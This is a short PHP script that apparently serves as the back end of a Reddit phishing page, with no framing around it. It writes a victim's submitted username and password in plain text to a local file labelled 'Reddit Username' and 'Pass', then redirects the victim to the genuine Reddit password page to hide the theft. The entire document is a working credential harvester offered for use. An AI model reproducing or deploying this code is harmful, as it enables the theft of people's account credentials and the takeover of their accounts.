<?php

file_put_contents("../userpass/usernames.txt", "Reddit Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.reddit.com/password');
exit();
?>
